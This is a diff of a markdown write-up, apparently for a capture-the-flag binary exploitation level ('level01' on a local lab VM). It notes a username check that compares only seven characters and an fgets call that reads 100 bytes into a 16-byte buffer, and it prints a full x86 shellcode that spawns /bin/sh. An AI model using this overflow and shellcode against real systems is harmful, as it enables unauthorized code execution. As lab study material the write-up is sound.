@@ -6,7 +6,7 @@
 scp -P 4242 level01@192.168.56.109:level01 binary/
 ```
 
-- name = `dat_wil`\
+- name = `dat_wil`
 - `verify_user_name()` check only the 7 first characters
 
 Interesting part :
@@ -15,9 +15,9 @@ char pass_input[16];
 ...
 fgets(pass_input, 100, stdin);
 ```
+**exploit** : `fgets` read 100 characters and store them in a buffer of size 16.\
 
 ## Buffer overflow : fgets exploit
-**exploit** : `fgets` read 100 characters and store them in a buffer of size 16.\
 **objective** : overflow pass_input to execute a shellcode
 
 shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
